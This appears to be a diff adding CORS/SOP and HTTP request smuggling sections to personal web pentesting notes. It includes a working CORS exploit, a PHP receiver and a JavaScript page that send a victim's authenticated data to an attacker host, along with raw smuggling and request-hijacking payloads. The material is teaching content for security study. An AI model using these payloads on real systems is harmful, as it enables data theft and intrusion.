@@ -8,11 +8,19 @@
 - [Advanced SQL Injection](#advanced-sql-injection)
 - [NoSQL Injection](#nosql)
 - [XXE Injection](#xxe-injection)
+- [Server-Side Template Injection](#server-side-template-injection)
 - [LDAP Injection](#ldap-injection)
 - [ORM Injection](#orm-injection)
 - [Insecure Deserialisation](#insecure-deserialisation)
 - [SSRF](#ssrf)
 - [File Inclusion and Path Traversal](#file-inclusion-and-path-traversal)
+- [Race Conditions](#race-conditions)
+- [Prototype Pollution](#prototype-pollution)
+- [XSS](#xss)
+- [CSRF](#csrf)
+- [DOM-Based Attacks](#dom-based-attacks)
+- [CORS and SOP](#cors-and-sop)
+- [HTTP Request Smuggling](#http-request-smuggling)
 
 *** ***
 
@@ -965,7 +973,7 @@
 
 ## Deserialisation:
 
-- It is simply a process where the data that have been serialised before transmitting over the network or system is converted or formatted back into an object. It is important for retrieving data from files, databases, or across networks, restoring it to its original state for use. Insecure deserialisation leads to security vulnerabilities where an attacker might alter the serialised objects to execute unauthorised actions or steal data.\
+- It is simply a process where the data that have been serialised before transmitting over the network or system is converted or formatted back into an object. It is important for retrieving data from files, databases, or across networks, restoring it to its original state for use. Insecure deserialisation leads to security vulnerabilities where an attacker might alter the serialised objects to execute unauthorised actions or steal data.
 
 ## Serialisation Formats:
 
@@ -1214,7 +1222,7 @@
     
 # Prototype Pollution
 
-- This vulnerability allows attackers to manipulate and exploit the inner workings of JavaScript applications and gain access to sensitive data and application backend. While it is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similat prototype-based inheritance model. For language models like JAVA and C++, this might not be a common practice because they follow a class-based inheritance. These are typically static and altering a class at a runtime to affect all of its instances might not be a good idea. 
+- This vulnerability allows attackers to manipulate and exploit the inner workings of JavaScript applications and gain access to sensitive data and application backend. While it is most commonly discussed in the context of JavaScript, the concept can apply to any system that uses a similar prototype-based inheritance model. For language models like JAVA and C++, this might not be a common practice because they follow a class-based inheritance. These are typically static and altering a class at a runtime to affect all of its instances might not be a good idea. 
 
 ## Essentials:
 
@@ -1271,7 +1279,7 @@
 
 - Difference between class and prototype:
 
-    - In JS, both of them are used to achieve a similar goal, which is creating objects with behaviours and characteristics. To understand the concept simply, classes is like having a detailed blueprint or a set of instructions for each model we want to develop. We folloe this blueprint exactly to create a model which have the exact same features and behaviours. While, a prototype is like having a basic model when can be then customised or modified by adding features directly on the model itself. With prototypes, we start with a simple object, then behaviours are added to the object by linking it to a prototype object that already has those behaviours. So, and object created this way are linked through the prototype chain, allowing them to inherit behaviours from other objects. This method is more dynamic and flexible.
+    - In JS, both of them are used to achieve a similar goal, which is creating objects with behaviours and characteristics. To understand the concept simply, classes is like having a detailed blueprint or a set of instructions for each model we want to develop. We follow this blueprint exactly to create a model which have the exact same features and behaviours. While, a prototype is like having a basic model which can be then customised or modified by adding features directly on the model itself. With prototypes, we start with a simple object, then behaviours are added to the object by linking it to a prototype object that already has those behaviours. So, and object created this way are linked through the prototype chain, allowing them to inherit behaviours from other objects. This method is more dynamic and flexible.
     
 - Inheritance:
 
@@ -1305,7 +1313,7 @@
     
         { "path": "reviews[0].content", "value": "&#60;script&#62;alert('xss')&#60;/script&#62;"
         
-        Here we used the _set function from lodash property to apply the payload and adding the review content to the specified path within a profile's object assuming the '_set' function is sued. By doing code analysis, we can perform property definition by path attack.
+        Here we used the _set function from lodash property to apply the payload and adding the review content to the specified path within a profile's object assuming the '_set' function is used. By doing code analysis, we can perform property definition by path attack.
         
 ## Exploitation - Property Injection:
 
@@ -1586,19 +1594,352 @@
 - To weaponise DOM-based XSS, we need to rely on the two conventional delivery methods of XSS payloads, storage and reflection. DOM-based XSS is harder to exploit because without a proper delivery method. So, we either need the web server to store out payload for later delivery or deliver the payload through reflection. As most modern web browsers encodes URL, so if the source is the URL then it can be tricky to achieve reflected XSS. So, if we perform XSS through stored user data, we need to find the sink where the data is added without sanitisation or validation. 
 
 - To fully weaponise XSS, we first need to have knowledge of what we have at hand. Many attempts could be done for this, such as attempting to steal the user's cookie value. But, with cookie security set to HttpOnly flag, this will be ruled out easily. So, we need to realise the power we have where we can fully execute XSS and load a staged payload to control user's browser. It is very important to browser the web application as a normal user at first to gain meaningful insights. Even if we achive an XSS on a page where there is not anything sensitive, we can instruct the browser to recover information from other, more sensitive pages or to perform state-changing actions on behalf of the user. So, all we need to do is understand the web appplication's functionality and tailor our XSS payload to leverage and use the functionality to our advantage. 
+
+# CORS and SOP
+
+- Cross-Origin Resource Sharing is a mechanism that allows web applications to request resources from different domain securely. 
+
+- Same-origin policy is a security measure that restricts web pages from interacting with resources from different origins. An origin is defined by scheme (protocol), hostname (domain), and URL port.
+
+## SOP:
+
+- This is a policy that lets web browser interact with other pages only if both pages share the same origin. This policy is designed to prevent a malicious script on one page from accessing sensitive data from the another page through the browser. The protocol, hostname and the port should match otherwise the resource is not provided by the server.
+
+## CORS:
+
+- This mechanism is defined by HTTP headers that allows servers to specify how resources can be requested from different origins. While the SOP restricts web pages by default to make requests to the same origin, CORS enables servers to declare exceptions to this policy by allowing web pages to interact and request resources from other domains under controlled conditions.
+
+- CORS operates through a set of HTTP headers that the server send as a part of the response to a browser. The server is not responsible to block or allow the request based on CORS, instead it processes the request and include CORS header in the response. The browser then interprets these headers and enforces the CORS policy by granting or denying the web pages JS access to the response based on the specified rules. 
+
+- HTTP headers Involved in CORS:
+
+    - Acess-Control-Allow-Origin: specifies which domains are allowed to access the resources. 
     
+    - Access-Control-Allow-Methods: specifies the HTTP methods that can be used during the request.
     
+    - Access-Control-Max-Age: defines how long the results of a preflight request be cached. 
     
+    - Access-Control-Allow-Credentials: instructs the browser whether to expose the response to the frontend JS cpde when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request.
     
+- Common Scenarios where CORS are implemented:
 
-
+    - APIs and Web Services: When a web application from one domain meeds to access the API hosted on a different domain, CORS enables this interaction. 
     
+    - Content Delivery Networks (CDNs): CORS can be used to load libraries like jQuery and fonts securely across different domains.
+    
+    - Third-Party Plugins/Widgets: CORS also enables to access other pulgins from one domain such as social media buttons or chatbots from extrernal sources on a website.
+    
+    - Multi-Domain User Authentication: Services offering single sign-on(SSO) or use tokens (like OAuth) to authenticate users across multiple domains rely on CORS to exchange authentication data securely. 
+    
+- Simple Requests vs Preflight Request:
 
+    - Simple Requests: They are treated similarly to same-origin requests, but with some restrictions. A simple request uses GET, HEAD, POST requests, where the 'Content-Type' header is one of 'application/x-www-form-urlencoded', 'multipart/form-data', 'text/plain'.Also, the request should not include custom headers that are not CORS-safe listed. These requests are sent directly to the server with the 'Origin' header, and the response is subject to CORS policy based on the 'Access-Control-Allow-Origin' header. The cookies and HTTP authentication are included in the request if the site has previously set such credentials, even without the 'Access-Control-Allow-Crendentials' header set to true.
+    
+    - Preflight Requests: These are the CORS request that the browser "preflights" with an OPTIONS request before sending the actual request to ensure the server is willing to accept the request based on CORS policy. A preflight request is triggered when the request does not qualify as a "simple request", such as when using HTTP methods other than GET, HEAD, or POST, or when the POST requests are being made with another 'Content-Type' other than the allowed values for simple requests, or when custom headers are included. The preflight OPTIONS request includes headers like 'Access-Control-Request-Method' and 'Access-Control-Request-Headers', which indicates the methods and headers of the actual request. The server then must respond with appropriate CORS headers, such as 'Access-Control-Allow-Methods', 'Access-Control-Allow-Headers', and 'Access-Control-Allow-Origin', which indicates that the actual request is permitted. If the preflight succeeds, the browser will send the actual request with credentials included if the 'Access-Control-Allow-Credentials' is set to true.  
+    
+## ACAO in depth:
 
+- Access-Control-Allow-Origin is crucial component of the CORS policy. It is used by servers to indicate whether the resources on a website can be accessed by a web page from a different origin. This header is the part of the HTTP response by the server. When a browser makes a cross-origin request, it includes the origin of the requesting site in the HTTP request. Then, the server checks this origin against its CORS policy. If the origin is permitted, the server includes 'Access-Control-Allow-Origin' header in the response by specifying the allowed origin and granting the access to the resources. If the origin is not permitted, the request is blocked thereafter.
 
+- ACAO Configurations:
 
+    1. Single Origin: This specifies that only request from a single origin is permitted for cross-origin requests.
+    
+    2. Multiple Origin: It is set dynamically based on the list of allowed origins. It allows requests from a specific set of origins that are configured.
+    
+    3. Wildcard Origin: It allows requests from any origin. 
+    
+    4. With Credentials: It allows sending of credentials, such as cookies and HTTP authentication data to be included in the cross-origin requests. However, simple requests automatically send these credentials with GET and POST requests even without 'Acces-Control-Allow-Credentials' being configured. And for preflight requests, this header must be set to true for the browser to send credentials.
+    
+## Common Misconfigurations:
 
+- Null Origin Misconfiguration: This occurs when a server accepts requests from the null origin. This can happen when the request is not a standard browser environment, like from a file (file://) or a data URL. So, an attacker can craft a phising email with a link to a malicious HTML file. On opening this file, it can send requests to the vulnerable server which incorrectly accepts these as coming from a 'null' origin. 
 
+- Bad Regex in Origin Checking: It occurs when the regular expressions in origin checking are improperly configured to accept requests from uninteded origins. For example, a regex like '/exmaple.com$/ would mistakely allow 'maliciousexample.com'. So, an attacker can register a domain that matches the flawed regex and create a malicious site to send requests to the target server.
 
+- Trusting Arbitrary Supplied Origin: Some servers are configured to echo back the 'Origin' header value in the 'Access-Control-Allow-Origin' response header, which effectively allows any origin. So here an attacker can craft a custom HTTP request with a controlled origin, and since the server echoes back this origin, the attacker's site can bypass the SOP restrictions. 
 
+## Exploitation:
 
+- There are various ways to exploit a vulnerable CORS misconfiguration, with crafted scripts and hosting a malicious HTML site that the victim would interact with to give us their information. So, if a webserver has flaws related to CORS, there may exists many attack vectors. So, suppose a server using PHP for backend is vulnerable to CORS misconfiguration. We need to first craft a script that will catch and exfiltrate the data of the victim on the vulnerable site. Then, we need to also craft a malicious site of our own that we will be phising to the victim to exfiltrate their data from the vulnerable server. Then, we will host an Apache2 server that will catch these data. As we know the web contents are served from /var/www/html, we will be creating a script in this location ans activate our Apache server for the exfiltration. A simple exfiltrating script will look like this:
+
+            <?php
+        header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
+        header('Access-Control-Allow-Credentials: true');
+
+        $postdata = file_get_contents("php://input");
+
+        file_put_contents('data.txt', $postdata);
+        ?>
+  
+  What this script does is captures the data from 'php://input' and save this to the data in a text file. This file should also be present in the same directory and should be made writable after creating it, so that the contents will be written into it.
+  
+ - As we have already setted up our exfiltrating point, now it is time to implement the exploitation to the vulnerable website and exfiltrate the data of the victim. As, arbitarty origin vulnerability echoes back any origin given in the request of the HTTP request, it is the most easy to exploit. So, what we will do is first create an exploit server where the exploit code will be saved. The exploit code will look like this:
+ 
+                <html>
+          <head>
+          <title>Data Exfiltrator Exploit</title>
+          <script>
+            //Function which will make CORS request to target application web page to grab the HTTP response
+            function exploit() {
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+              if (this.readyState == 4 && this.status == 200) {
+                var all = this.responseText;
+                exfiltrate(all);
+             }
+            };
+            xhttp.open("GET", "http://vulnerable.com/arbitrary.php", true);
+            xhttp.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,\/;q=0.8");
+            xhttp.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+            xhttp.withCredentials = true;
+            xhttp.send();
+            }
+
+            function exfiltrate(data_all) {
+                  var xhr = new XMLHttpRequest();
+                  xhr.open("POST", "http://MACHINE_IP/receiver.php", true); //this is the attacker's server and the receiver.php is the script that will be sent to the vulnerable server to save the output
+
+                  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+                  xhr.withCredentials = true;
+                  var body = data_all;
+                  var aBody = new Uint8Array(body.length);
+                  for (var i = 0; i < aBody.length; i++)
+                    aBody[i] = body.charCodeAt(i);
+                  xhr.send(new Blob([aBody]));
+            }
+            </script>
+        </head>
+        <body onload="exploit()">
+        <div style="margin: 10px 20px 20px; word-wrap: break-word; text-align: center;">
+        <textarea id="load" style="width: 1183px; height: 305px;">
+        
+  Here, we are getting the request on the vulnerable site with arbitrary vulnerability endpoint. The exploit code is using XMLHttpRequest to send request to the vulnerable application and process the response. The processed response will then be sent to the web server with the 'receiver.php' file. So, when the victim clicks on this crafted link redirecting to this server for the exfiltration of data, we will receive a POST request from the victim in our exfiltrator server that can be found at '/var/www/html/data.txt' as we specified it to be saved in this particular file.
+  
+- This same script could also be used to exploit Bad Regex in Origin and Null origin, as the only thing that will be different is the vulnerable endpoint and the use of the crafted server on the attacker point. So, suppose the application 'http://example.com' has bad regex origin, we can host a web server with 'http://example.com.malicous.com', which the vulnerable server will accept the request from. And from the same phising tactic we can again gain sensitive information from the victim in our environment. So, it is all about making a cross-origin request that satisfies the CORS misconfigurations. To exploit a null origin misconfiguration, we can simply create a malicious webpage with an iframe containg JavaScript code that will make cross-origin requests to the target application. The script above will do the job here also. It is important to understadn that XSS can also be chained with CORS if the application is designed to accept JavaScript or HTML code and then save it to the database. This means we can inject JavaScript or HTML code into ther application, and once the victim visits the application, the payload will be executed.
+
+# HTTP Request Smuggling
+
+- HTTP Request Smuggling is a technique that exploits the discrepancies in how front-end and back-end servers interpret HTTP requests. In modern web architectures, user requests rarely hit the application server directly. Instead, they pass through intermediaries like reverse proxies, load balancers, or CDNs before reaching the backend. When these two entities disagree on where one request ends and another begins, an attacker can "smuggle" a hidden request inside a legitimate one. This vulnerability can lead to bypassing security controls, poisoning web caches, hijacking other users' requests, and even achieving remote code execution in some cases.
+
+- The root cause of this attack lies in how HTTP/1.1 defines two methods to specify the length of the request body: the 'Content-Length' header and the 'Transfer-Encoding' header. When both are present in a single request, the servers in the chain might prioritise one over the other differently which creates the desynchronisation that attackers exploit.
+
+## HTTP Request Fundamentals:
+
+- Content-Length Header:
+
+    - This header specifies the exact size of the request body in bytes. When a server receives a request with 'Content-Length: 13', it reads exactly 13 bytes from the body and treats the rest as the beginning of a new request. It is straightforward and is one of the oldest methods to indicate the length of the body. 
+    
+- Transfer-Encoding Header:
+
+    - This header indicates the encoding used for the message body. The most common value is 'chunked', which means the body is sent in chunks, each preceded by its size in hexadecimal. A chunk size of '0' indicates the end of the body. This is useful when the full size of the body is not known in advance, like in streaming responses or dynamically generated content. A chunked request looks like this:
+    
+        POST / HTTP/1.1
+        Host: example.com
+        Transfer-Encoding: chunked
+        
+        b
+        hello=world
+        0
+        
+    Here, 'b' is the hexadecimal representation of 11 which is the length of 'hello=world'. Then, the '0' indicates the end of the chunked body.
+
+- The Desync Problem:
+
+    - HTTP/1.1 specification states that if both 'Content-Length' and 'Transfer-Encoding' headers are present, then 'Transfer-Encoding' should take precedence. However, not all servers follow this rule. Some front-end servers prioritise 'Content-Length', while the back-end server prioritises 'Transfer-Encoding', or vice versa. This disagreement is where the desynchronisation happens and the magic of smuggling begins.
+
+## Types of HTTP Request Smuggling:
+
+- CL.TE (Content-Length prioritised by Front-End, Transfer-Encoding by Back-End):
+
+    - In this scenario, the front-end server uses 'Content-Length' to determine the length of the request, while the back-end uses 'Transfer-Encoding'. So, the front-end reads the entire body based on the Content-Length value and forwards it to the back-end. But the back-end processes it as chunked, and the leftover bytes after the '0\r\n\r\n' chunk terminator are treated as the beginning of a new request. An example request looks like:
+    
+        POST / HTTP/1.1
+        Host: vulnerable.com
+        Content-Length: 30
+        Transfer-Encoding: chunked
+        
+        0
+        
+        GET /admin HTTP/1.1
+        
+    Here, the front-end sees 'Content-Length: 30' and forwards the entire body. The back-end processes it as chunked, reads '0' as the end of the first request, and then treats 'GET /admin HTTP/1.1' as the start of a brand new second request. This smuggled request could bypass access controls or interact with restricted endpoints.
+
+- TE.CL (Transfer-Encoding prioritised by Front-End, Content-Length by Back-End):
+
+    - This is the reverse of CL.TE. The front-end processes the request as chunked and the back-end relies on Content-Length. So, the front-end reads the body until the '0' chunk terminator and forwards everything. But the back-end only reads the number of bytes specified by Content-Length, and the remaining bytes are left in the buffer to be interpreted as the next request. An example will be:
+    
+        POST / HTTP/1.1
+        Host: vulnerable.com
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        
+        5c
+        GPOST /admin HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+        
+        x=1
+        0
+        
+    The front-end reads it as chunked and forwards the whole thing. But the back-end reads only 4 bytes from the body because of 'Content-Length: 4', and the rest of the data starting from 'GPOST /admin...' is queued up and interpreted as a separate request.
+
+- TE.TE (Transfer-Encoding prioritised by both, but with Obfuscation):
+
+    - When both the front-end and back-end support Transfer-Encoding, the attack relies on obfuscating the header so that one of the servers fails to recognise it as a valid Transfer-Encoding header. This causes a fallback to Content-Length, effectively creating a CL.TE or TE.CL scenario. Various obfuscation techniques can be used:
+    
+        Transfer-Encoding: xchunked
+        
+        Transfer-Encoding : chunked
+        
+        Transfer-Encoding: chunked
+        Transfer-Encoding: x
+        
+        Transfer-Encoding:[tab]chunked
+        
+        X: x[\n]Transfer-Encoding: chunked
+        
+        Transfer-Encoding
+        : chunked
+        
+    Each of these can trick one server into ignoring the header while the other processes it. The key is to experiment and see which obfuscation technique causes the desync between the two servers in the chain.
+
+## HTTP Desync Attacks:
+
+- HTTP desync attacks are the weaponised form of request smuggling where the goal is to cause real damage by exploiting the desynchronisation between the front-end and back-end. The desync itself is just the mechanism, but the real impact comes from what we can do with the smuggled request. These attacks can be chained with other vulnerabilites to escalate the severity significantly.
+
+- Request Hijacking:
+
+    - One of the most powerful outcomes of a desync attack is hijacking other users' requests. When we smuggle a partial request into the back-end's buffer, the next legitimate user's request gets appended to our smuggled request. So, if we smuggle a POST request to an endpoint that reflects or stores data, the victim's request including their cookies, session tokens, and credentials gets attached to our smuggled request body. This is like sitting in a queue and cutting the line where everyone else's ticket ends up in our pocket. A smuggled request for hijacking could look like:
+    
+        POST / HTTP/1.1
+        Host: vulnerable.com
+        Content-Length: 100
+        Transfer-Encoding: chunked
+        
+        0
+        
+        POST /log HTTP/1.1
+        Host: vulnerable.com
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 400
+        
+        data=
+        
+    When the next user sends their request, the back-end appends it to the 'data=' parameter. Now the smuggled request captures the victim's entire HTTP request with all the sensitive headers and cookies.
+
+- Web Cache Poisoning via Smuggling:
+
+    - If the front-end is a caching server, then request smuggling can be used to poison the cache. The idea is to smuggle a request that changes the response the cache stores for a particular URL. So, we can trick the cache into storing a malicious response and serving it to other users. This is like replacing the menu in a restaurant so that every customer gets the wrong dish. For example, we could smuggle a request that redirects to an attacker-controlled server, and the cache would store this redirect and serve it to every user requesting that resource.
+
+- Bypassing Security Controls:
+
+    - Front-end servers often enforce security controls such as access restrictions, WAF rules, and authentication checks. Since the smuggled request bypasses the front-end entirely and is directly processed by the back-end, these security controls become useless. So, restricted admin panels, internal endpoints, or protected resources can be accessed directly through the smuggled request without triggering any front-end security measures.
+
+## WebSocket Smuggling:
+
+- WebSocket connections start with an HTTP upgrade handshake, which makes them an interesting target for smuggling attacks. When a client wants to establish a WebSocket connection, it sends an HTTP request with the 'Upgrade: websocket' header. The server then responds with a '101 Switching Protocols' status code, and the connection is upgraded from HTTP to WebSocket. The problem arises when the reverse proxy or front-end server handles this upgrade process differently than the back-end server.
+
+- How WebSocket Upgrade Works:
+
+    - The initial handshake looks like this:
+    
+        GET /chat HTTP/1.1
+        Host: example.com
+        Upgrade: websocket
+        Connection: Upgrade
+        Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+        Sec-WebSocket-Version: 13
+        
+    If the server supports WebSocket, it responds with:
+    
+        HTTP/1.1 101 Switching Protocols
+        Upgrade: websocket
+        Connection: Upgrade
+        Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
+        
+    After this handshake, the connection is no longer HTTP and both parties can send WebSocket frames bidirectionally.
+
+- WebSocket Upgrade Smuggling:
+
+    - The vulnerability comes when the front-end server incorrectly assumes that a WebSocket upgrade has occurred. If the front-end sees the upgrade request and believes the connection has been upgraded to WebSocket, it stops interpreting the data on that connection as HTTP. But, if the back-end server actually rejected the upgrade or did not properly handle it, the connection remains as HTTP on the back-end side. This creates a tunnel where the front-end is no longer inspecting or filtering the traffic, and an attacker can smuggle arbitrary HTTP requests through this "upgraded" connection directly to the back-end without any security checks.
+    
+    - An attacker could craft a malicious upgrade request that the front-end processes as a WebSocket upgrade while the back-end rejects or ignores it. Once the front-end stops inspecting the connection, the attacker sends raw HTTP requests over the same TCP connection that go straight to the back-end. This is dangerous because the front-end's WAF, access controls, rate limiting, and other security measures are completely bypassed.
+
+- H2C Smuggling (HTTP/2 Cleartext):
+
+    - This is similar to WebSocket smuggling but involves the upgrade from HTTP/1.1 to HTTP/2 over cleartext (h2c). The 'Upgrade: h2c' header is used to request this upgrade. If the front-end server forwards the upgrade request but does not understand or support h2c, while the back-end does, then the connection gets upgraded on the back-end side. The front-end continues to treat the connection as HTTP/1.1 and the back-end treats it as HTTP/2. This desync allows an attacker to send HTTP/2 frames that the front-end cannot inspect or filter, effectively smuggling requests past all front-end security controls.
+    
+    - The upgrade request looks like:
+    
+        GET / HTTP/1.1
+        Host: example.com
+        Upgrade: h2c
+        HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+        Connection: Upgrade, HTTP2-Settings
+        
+    If the front-end blindly forwards this and the back-end upgrades the connection, the attacker now has a direct HTTP/2 channel to the back-end that is invisible to the front-end.
+
+## HTTP/2 Desync Attacks:
+
+- With the adoption of HTTP/2, new variants of request smuggling have emerged. HTTP/2 is a binary protocol that uses frames to encapsulate requests, unlike HTTP/1.1 which is text-based. When a front-end server receives an HTTP/2 request and then downgrades it to HTTP/1.1 before forwarding it to the back-end, the translation process can introduce desync vulnerabilites.
+
+- H2.CL Smuggling:
+
+    - In HTTP/2, the length of the request body is determined by the DATA frames, so the 'Content-Length' header is technically redundant. But when the front-end downgrades the request to HTTP/1.1, it might include the 'Content-Length' header from the original HTTP/2 request. If an attacker sets a 'Content-Length' header in the HTTP/2 request that does not match the actual body length, the back-end server processing the downgraded HTTP/1.1 request could be tricked into reading more or fewer bytes than intended, causing a desync.
+
+- H2.TE Smuggling:
+
+    - HTTP/2 does not support chunked transfer encoding as it has its own framing mechanism. But, if the front-end blindly copies the 'Transfer-Encoding: chunked' header during the downgrade to HTTP/1.1, the back-end could process the body as chunked. This creates an opportunity for smuggling similar to the classic TE.CL scenario.
+
+- Request Header Injection via HTTP/2:
+
+    - HTTP/2 headers are transmitted as binary key-value pairs and newlines are not supposed to appear in header values. But, some implementations fail to properly validate this. If an attacker can inject newline characters (\r\n) into HTTP/2 header values, the downgraded HTTP/1.1 request will interpret these as header separators, allowing the injection of additional headers or even a completely new request.
+
+## Detection and Testing:
+
+- Detecting request smuggling vulnerabilites requires careful observation and timing-based techniques. The idea is to send ambiguous requests and see how the server chain behaves. A few practical approaches are:
+
+- Timing-Based Detection:
+
+    - One of the most reliable methods is to use timing differences to detect desync behaviour. If we send a request that would cause the back-end to wait for additional data (because it thinks the request is not complete), the response time will be noticeably longer. For example, in a CL.TE scenario, we can send a request where the Content-Length includes the smuggled portion, but the chunked encoding terminates early. If the back-end times out waiting for more data, the delay confirms the desync.
+
+- Differential Response Detection:
+
+    - Another approach is to send two requests in quick succession where the second request should be affected by the smuggled content from the first. If the response to the second request is unexpected (like a 404 or a redirect that was not intended), it indicates that our smuggled content interfered with the second request.
+
+- Tools:
+
+    - Burp Suite: The HTTP Request Smuggler extension by James Kettle is a powerful tool for automating the detection and exploitation of request smuggling vulnerabilites. It supports various smuggling techniques and can identify desync issues across different server configurations.
+    
+    - smuggler.py: A Python-based tool designed to detect HTTP request smuggling vulnerabilites by testing various CL.TE, TE.CL, and TE.TE payloads against a target.
+    
+    - h2csmuggler: A specialised tool for testing h2c upgrade smuggling vulnerabilites.
+
+## Chaining with Other Vulnerabilites:
+
+- As with many web vulnerabilites, the real power of request smuggling comes from chaining it with other flaws to increase the severity. Some of the common chains are:
+
+    - Smuggling + XSS: If we can smuggle a request that injects a reflected XSS payload into the response that gets cached or served to another user, we can escalate from smuggling to stored XSS that affects all visitors.
+    
+    - Smuggling + Cache Poisoning: By smuggling a request that causes the cache to store a malicious response, we can serve this poisoned response to every user visiting that URL for as long as the cache entry is valid.
+    
+    - Smuggling + SSRF: If the back-end has internal endpoints that are not exposed through the front-end, smuggling can be used to reach them. This turns a smuggling vulnerability into an SSRF that can interact with internal services.
+    
+    - Smuggling + Credential Theft: Through request hijacking where a victim's request is appended to our smuggled request, we can capture session tokens, API keys, and other sensitive credentials without any interaction from the victim.
+
+## Mitigations:
+
+- As pentesters, we should be aware of the defensive measures so that we can test their effectiveness during assessments:
+
+    - Normalise Request Parsing: Ensure both the front-end and back-end servers use the same method for determining request boundaries. If Content-Length and Transfer-Encoding conflict, the request should be rejected outright rather than guessing.
+    
+    - Reject Ambiguous Requests: Any request containing both 'Content-Length' and 'Transfer-Encoding' headers should be dropped immediately with a 400 Bad Request response.
+    
+    - Use HTTP/2 End-to-End: If possible, avoid downgrading HTTP/2 to HTTP/1.1 between the front-end and back-end. Keeping the entire chain on HTTP/2 eliminates the translation-based desync issues.
+    
+    - Disable Unnecessary Protocol Upgrades: If WebSocket or h2c upgrades are not required, disable them on the front-end to prevent upgrade-based smuggling attacks.
+    
+    - Ensure Connection Isolation: Each client connection should be isolated from other connections so that leftover data from one request cannot affect another user's request.
+    
+    - Regular Testing: Conduct periodic security assessments specifically targeting request smuggling, as these vulnerabilites can be introduced with infrastructure changes that modify the server chain.
